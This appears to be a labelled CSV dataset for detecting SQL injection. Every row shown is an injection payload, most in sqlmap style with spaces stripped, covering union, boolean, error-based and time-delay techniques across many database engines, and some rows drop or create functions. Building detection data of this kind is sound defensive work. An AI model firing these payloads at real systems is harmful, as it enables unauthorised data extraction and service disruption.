payload,attack_type,label
"1"")))or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and(((""wvlb""like""wvlb",sqli,1
"1)astgqdwhere6369=6369and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1
"1"")))waitfordelay'0:0:5'and(((""ckht""=""ckht",sqli,1
"1%')androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)and('%'='",sqli,1
-6179))or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and((7732=7732,sqli,1
"1%')procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1);selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and(3770=3770",sqli,1
"1'where7080=7080or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
1')));select(casewhen(6969=5797)then6969else6969*(select6969frominformation_schema.character_sets)end)#,sqli,1
"-2901""orelt(9866=9099,9099)and""asib""like""asib",sqli,1
"1');selectbenchmark(5000000,md5(0x4c4d6142))",sqli,1
"1')))and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
-1386')or(7880=5362)*5362and('vsyu'like'vsyu,sqli,1
1'))asiutawhere1482=1482;waitfordelay'0:0:5'--,sqli,1
1'));select(casewhen(8601=1220)then8601else8601*(select8601frommysql.db)end)#,sqli,1
"1'inbooleanmode)or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)#",sqli,1
"-5193where2175=2175unionallselect2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",sqli,1
"1')unionallselectnull,null,null,null,null,null#",sqli,1
"1'))and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(('tqpj'='tqpj",sqli,1
"1%""))unionallselectnull,null,null,null,null,null#",sqli,1
1'||(select'gnil'fromdualwhere7552=7552rlike(select(casewhen(7689=7689)then1else0x28end)))||',sqli,1
1)where6494=6494;if(6745=4078)select6745elsedropfunctionytyt--,sqli,1
1'or6793=(select6793frompg_sleep(5)),sqli,1
"1%"");selectsleep(5)and(""%""=""",sqli,1
1'));selectsleep(5)and(('keoy'='keoy,sqli,1
1)));select(casewhen(4666=4666)then1else4666*(select4666frommaster..sysdatabases)end)--,sqli,1
"1""))asexzowhere7518=7518(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))--",sqli,1
"1%""))and7533=7533and((""%""=""",sqli,1
"1%""unionallselectnull#",sqli,1
"1'orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)and'esjl'='esjl",sqli,1
"1"")where1107=1107and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
1'+(selectmrdiwhere7451=7451and8594=(select8594frompg_sleep(5))--,sqli,1
"1)or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and(4976=4976",sqli,1
-5291'))or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and(('tmpm'='tmpm,sqli,1
1)where1090=1090and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')--,sqli,1
"1%')orelt(5873=5873,sleep(5))#",sqli,1
1'inbooleanmode)or(select*from(select(sleep(5)))ydpu)#,sqli,1
"1"")));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and(((""ekbq""=""ekbq",sqli,1
"1'))and8407=(selectcount(*)fromgenerate_series(1,5000000))and(('lwyo'='lwyo",sqli,1
1)orsleep(5)#,sqli,1
"1"")where5938=5938and(select*from(select(sleep(5)))gcrr)#",sqli,1
1);begindbms_lock.sleep(5);endand(9416=9416,sqli,1
"-5579%"")or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and(""%""=""",sqli,1
"1""where4684=4684unionallselectnull,null,null,null#",sqli,1
"1))aswufrwhere5239=5239or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
-8047'or3038=3038,sqli,1
1')rlikesleep(5)and('boto'='boto,sqli,1
"1)and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
-8071))or9160=4253,sqli,1
1'))ascmllwhere7948=7948and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1
"1"")andsleep(5)#",sqli,1
"1')or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and('yabn'='yabn",sqli,1
"1'where1917=1917or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
1)astbvewhere4828=4828;selectsleep(5)#,sqli,1
"-4694')where1501=1501unionallselect1501,1501,1501,1501,1501,1501#",sqli,1
1))asprxqwhere4600=4600;(select*from(select(sleep(5)))acdk)#,sqli,1
"1%'));callregexp_substring(repeat(right(char(3702),0),500000000),null)and(('%'='",sqli,1
"1'where8729=8729;selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
"1)asazdbwhere4219=4219unionallselectnull,null,null,null#",sqli,1
"1%"")));beginuser_lock.sleep(5);endand(((""%""=""",sqli,1
"1""))asisqjwhere6344=6344unionallselectnull,null,null,null--",sqli,1
"1'))or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and(('aumk'like'aumk",sqli,1
-6086'))or(6719=7280)*7280and(('ozbj'='ozbj,sqli,1
"-2333'unionallselect9714,9714,9714--",sqli,1
"1'||(select'frrk'fromdualwhere3145=3145andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71)))||'",sqli,1
"1'orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and'zenl'like'zenl",sqli,1
"-5904""where9782=9782or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')--",sqli,1
"1'));selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"1'unionallselectnull,null,null,null,null#",sqli,1
1)))waitfordelay'0:0:5'and(((3481=3481,sqli,1
"1'||(select'scba'where9079=9079and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
1)))andsleep(5)and(((6618=6618,sqli,1
-9355'or6872=6872and'mztk'='mztk,sqli,1
1')and3715in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(3715=3715)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1
"-3349'orelt(6610=4379,4379)and'poqm'like'poqm",sqli,1
"1""))or(select*from(select(sleep(5)))sddo)#",sqli,1
"1""));select*fromgenerate_series(6200,6200,casewhen(6200=5449)then1else0end)limit1--",sqli,1
"1%"")orchar(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1')))and5615=5458--,sqli,1
"-3954'))unionallselect2417,2417--",sqli,1
"1where8389=8389unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1"")asrovdwhere3764=3764andelt(4249=4249,7259)--",sqli,1
-7633')asasljwhere2317=2317or8571=8571--,sqli,1
"1%'))procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and(('%'='",sqli,1
"-8521')unionallselect2446,2446,2446,2446,2446,2446,2446#",sqli,1
"-3620'||(select'kmei'where8533=8533unionallselect8533,8533,8533,8533--",sqli,1
"1)aswxmswhere7272=7272and3707=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1')ashatswhere2011=2011unionallselectnull,null,null,null,null#",sqli,1
"-9171)unionallselect6880,6880,6880,6880,6880,6880,6880#",sqli,1
1where2649=2649or(select*from(select(sleep(5)))ydpu)--,sqli,1
1)asgfhfwhere5804=5804or6793=(select6793frompg_sleep(5))--,sqli,1
-7072')or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual),sqli,1
"1'where1895=1895or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1'))andelt(4249=4249,7259)and(('xjns'='xjns",sqli,1
-8828%')))or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and((('%'=',sqli,1
"1unionallselectnull,null,null,null,null,null,null,null--",sqli,1
"-1366'ormake_set(9354=9354,7185)and'abre'='abre",sqli,1
"1and4241=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(4241=4241)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1
"1'))asjpxjwhere6153=6153or8156=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"1"";selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
-5555))asldtewhere4583=4583orderby1#,sqli,1
"1%""andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))and""%""=""",sqli,1
-1304')unionallselect7639#,sqli,1
"1'))unionallselectnull,null#",sqli,1
"-7236ormake_set(9618=6919,6919)",sqli,1
"1"";iif(5257=5257,1,1/0)",sqli,1
"1and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--gkcl",sqli,1
"1%'))or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and(('%'='",sqli,1
"1%')))androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)and((('%'='",sqli,1
"1'+(selectmhfnwhere2425=2425;selectcount(*)fromgenerate_series(1,5000000))+'",sqli,1
"1""));selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
-7979'+(select'bkvt'where3613=3613unionallselect3613#,sqli,1
"1,(select9100=('qqpjq'||(selectcase9100when9100then1else0endfromrdb$database)||'qzvzq'))",sqli,1
1')asxiqwwhere8507=8507rlikesleep(5)--,sqli,1
"1')));createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)and((('iwwa'like'iwwa",sqli,1
"-7485%')))unionallselect1303,1303,1303,1303,1303,1303,1303,1303,1303--",sqli,1
"1%'))unionallselectnull,null#",sqli,1
"1')where9304=9304or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"");select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#",sqli,1
"1""andmake_set(8403=8403,8899)and""bbgg""=""bbgg",sqli,1
"1""))asvtadwhere3653=3653procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1"")))orsleep(5)and(((""eran""=""eran",sqli,1
"1))orelt(5873=5873,sleep(5))#",sqli,1
"1'or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and'aytf'like'aytf",sqli,1
"1'+(select'yhcf'where8367=8367;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
1%'))orsleep(5)#,sqli,1
"1"")where4588=4588;begindbms_lock.sleep(5);end--",sqli,1
"1%')and3824=benchmark(5000000,md5(0x76555642))and('%'='",sqli,1
"1%')andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))and('%'='",sqli,1
"1'));selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5and(('xaoi'='xaoi",sqli,1
"1'||(select'setd'fromdualwhere3686=3686(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users))||'",sqli,1
"1""where5353=5353andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1
"(extractvalue(1759,concat(0x5c,0x7171706a71,(select(elt(1759=1759,1))),0x717a767a71)))",sqli,1
"1,(select(casewhen(8640=8640)then(ascii(regexp_substring(repeat(right(char(8640),0),500000000),null)))else8640/(select0frominformation_schema.system_users)end)frominformation_schema.system_users)--",sqli,1
1)waitfordelay'0:0:5'--,sqli,1
"-7601"")))unionallselect1293,1293,1293,1293,1293,1293,1293,1293--",sqli,1
1'))unionallselectnull--,sqli,1
"1')where2090=2090;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
1)))or(select*from(select(sleep(5)))ydpu)and(((3332=3332,sqli,1
1%')));select(casewhen(3855=3855)then3855else1/(select0)end)--,sqli,1
1'waitfordelay'0:0:5'and'dtej'like'dtej,sqli,1
1)where1203=1203rlike(select*from(select(sleep(5)))vwyq)#,sqli,1
"1"")))procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and(((""tabq""like""tabq",sqli,1
"1'||(select'aevx'fromdualwhere9999=9999;createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5))||'",sqli,1
"1)orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and(3326=3326",sqli,1
"1%')));iif(5257=5257,1,1/0)",sqli,1
"1%""procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and""%""=""",sqli,1
"1""unionallselectnull,null,null,null,null,null,null,null--",sqli,1
"-4756%'))unionallselect7824,7824,7824,7824,7824,7824,7824,7824#",sqli,1
-9555')))or(8459=8459)*4906and((('rwpq'like'rwpq,sqli,1
"-9286""))asmfxlwhere9348=9348unionallselect9348#",sqli,1
"-9008')unionallselect4976,4976,4976,4976#",sqli,1
"1')))orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and((('ujjr'='ujjr",sqli,1
"1%'))unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1')));callregexp_substring(repeat(right(char(3702),0),500000000),null)and((('gsup'='gsup",sqli,1
"1%'));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
"1%"")procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and(""%""=""",sqli,1
"-8794)))unionallselect5802,5802,5802--",sqli,1
"-6400))unionallselect4650,4650,4650--",sqli,1
-8615)))or4039=9144,sqli,1
"1%"")orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)and(""%""=""",sqli,1
1'where4795=4795and4595=4595#,sqli,1
"1""""(.'.(,(.",sqli,1
1')))and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and((('eocx'='eocx,sqli,1
1');select(casewhen(7096=2568)then7096else1/(select0)end)--,sqli,1
1where6827=6827;selectcasewhen7717=7717then1elsenullend--,sqli,1
"1""))asjikgwhere8258=8258and(3973=1047)*1047--",sqli,1
"1where8135=8135;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"1""and8407=(selectcount(*)fromgenerate_series(1,5000000))and""eslo""like""eslo",sqli,1
"1"")))or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)and(((""hkjm""like""hkjm",sqli,1
1');beginuser_lock.sleep(5);endand('rlux'like'rlux,sqli,1
"1""))unionallselectnull,null,null#",sqli,1
"1"");selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"1'orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and'uwep'='uwep",sqli,1
"1))orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and((8475=8475",sqli,1
"1%');selectlike('abcdefg',upper(hex(randomblob(500000000/2))))and('%'='",sqli,1
"-9582')where4397=4397unionallselect4397,4397,4397#",sqli,1
1'+(select'uetb'where6468=6468;select(casewhen(4660=4660)then4660elsecast(1asint)/(select0fromdual)end)fromdual--,sqli,1
"-9076'+(selectlqvjwhere8551=8551unionallselect8551,8551,8551,8551--",sqli,1
"1"")where6671=6671orchar(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"-8109%""))unionallselect9089,9089--",sqli,1
1'||(select'yezk'where2097=2097;if(3593=3779)select3593elsedropfunctionqtqy--,sqli,1
1%'))rlike(select*from(select(sleep(5)))vwyq)#,sqli,1
"1""))asubrgwhere7318=7318and7331=6529--",sqli,1
"-5078unionallselect9708,9708--",sqli,1
"1'))asiipjwhere6560=6560;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"1""andelt(4249=4249,7259)",sqli,1
"1""andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and""pmpk""like""pmpk",sqli,1
"1)))and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(((4744=4744",sqli,1
"1%';selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and'%'='",sqli,1
1'where4473=4473and(select*from(select(sleep(5)))gcrr)#,sqli,1
"1or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1'))asorvywhere7270=7270unionallselectnull,null,null,null,null,null,null,null#",sqli,1
"-2979'))asklouwhere7092=7092unionallselect7092,7092--",sqli,1
1')))and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and((('ugoz'='ugoz,sqli,1
"1)unionallselectnull,null,null,null,null,null,null,null,null,null--",sqli,1
"1""))andelt(4249=4249,7259)and((""abcm""like""abcm",sqli,1
"1'inbooleanmode)orelt(5873=5873,sleep(5))#",sqli,1
-5585'or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual),sqli,1
"1';selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3and'conm'like'conm",sqli,1
-6200%'))or8077=4661,sqli,1
-8224')where6504=6504or2461=5660,sqli,1
1))asbjxdwhere4299=4299;selectpg_sleep(5)--,sqli,1
1'));waitfordelay'0:0:5'and(('nvqf'='nvqf,sqli,1
"1""or7417=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1)))and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"-4480')where4661=4661or1570=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(1570=1570)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
1%')))and(select*from(select(sleep(5)))fzno)and((('%'=',sqli,1
1'+(select'yahq'where6974=6974unionallselectnull--,sqli,1
1and2006=2006,sqli,1
"1""where6352=6352;begindbms_lock.sleep(5);end--",sqli,1
"1%"")))andelt(3114=3114,sleep(5))#",sqli,1
1')))waitfordelay'0:0:5'and((('clcf'='clcf,sqli,1
"1'))unionallselectnull,null,null,null,null,null,null--",sqli,1
"1'||(select'uqbj'fromdualwhere6736=6736orchar(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1'))androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)and(('pbtf'='pbtf",sqli,1
-6222))or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and((3230=3230,sqli,1
"1"")));if(8727=4039)select8727elsedropfunctiongiql--",sqli,1
"-4223')))unionallselect7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",sqli,1
"1')))and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))and((('zovb'like'zovb",sqli,1
"1%"")or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1%"")))and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and(((""%""=""",sqli,1
"1"")where3445=3445andelt(1212=1254,1254)--",sqli,1
1'))and2006=2006,sqli,1
"1')and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and('vgkt'='vgkt",sqli,1
1'inbooleanmode)and6969=(select6969frompg_sleep(5))#,sqli,1
"1where1062=1062andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1',(select(casewhen(2073=5314)then1else1/(select0)end))",sqli,1
"1%"")))or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)and(((""%""=""",sqli,1
"exp(~(select*from(selectconcat(0x7171706a71,(select(elt(1049=1049,1))),0x717a767a71,0x78))x))",sqli,1
"1""or8466=benchmark(5000000,md5(0x694a4745))and""xbft""=""xbft",sqli,1
select'qqpjq'||(select(casewhen(2933=2933)then1else0end))||'qzvzq',sqli,1
"-7043"")where9755=9755unionallselect9755,9755,9755,9755,9755,9755#",sqli,1
"-7233"")where7574=7574or5821=3288",sqli,1
"1')aswjtywhere2971=2971;selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
"-9496)))orelt(7511=3951,3951)and(((3514=3514",sqli,1
-9197')or(6877=8010)*8010and('umwl'='umwl,sqli,1
"1orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))--uslt",sqli,1
"1""));selectdbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5)fromdual--",sqli,1
"-9237')unionallselect7454,7454,7454,7454,7454,7454,7454,7454,7454--",sqli,1
"1"")andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)and(""mlld""like""mlld",sqli,1
"1"")where6632=6632or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1
1)orsleep(5)and(2211=2211,sqli,1
"1);iif(5257=5257,1,1/0)",sqli,1
"1"")or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(""azpb""=""azpb",sqli,1
"1%"")and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and(""%""=""",sqli,1
"1where2956=2956;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"-9820""or1038=7502#",sqli,1
"1"")asamakwhere7938=7938andelt(1210=1210,sleep(5))--",sqli,1
"1""where5477=5477;select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
"1';callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1
-6218'))or2236=4469#,sqli,1
"1%'))unionallselectnull,null,null,null#",sqli,1
1%'rlike(select*from(select(sleep(5)))vwyq)#,sqli,1
"1%"";select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
-7199'or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and'qibr'='qibr,sqli,1
1'+(selectggahwhere3263=3263and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq'))+',sqli,1
"1""where8387=8387;select(casewhen(2751=8206)then2751elsecast(1asint)/(select0fromdual)end)fromdual--",sqli,1
1;begindbms_lock.sleep(5);end,sqli,1
"1%')or5356=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"-5587%')orelt(1032=1032,3623)and('%'='",sqli,1
"1'+(select'jhce'where1117=1117and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5))+'",sqli,1
"1""orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and""dtwv""like""dtwv",sqli,1
"1""));callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and((""squx""like""squx",sqli,1
"1"")or6793=(select6793frompg_sleep(5))and(""lsis""like""lsis",sqli,1
"1where5401=5401andelt(1210=1210,sleep(5))--",sqli,1
"1'+(selectbptuwhere7356=7356(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0))))+'",sqli,1
1)))unionallselectnull#,sqli,1
"1'inbooleanmode)orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)#",sqli,1
"1"")))rlikesleep(5)and(((""qcqx""like""qcqx",sqli,1
"1%')))andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1')))and3824=benchmark(5000000,md5(0x76555642))and((('zurf'='zurf",sqli,1
"-8735'))unionallselect3262,3262,3262--",sqli,1
1')asbihswhere4197=4197;selectpg_sleep(5)--,sqli,1
"1)where2720=2720andelt(4249=4249,7259)--",sqli,1
"-7565'))unionallselect7745,7745,7745,7745,7745,7745#",sqli,1
"-5169""))unionallselect6198,6198,6198,6198--",sqli,1
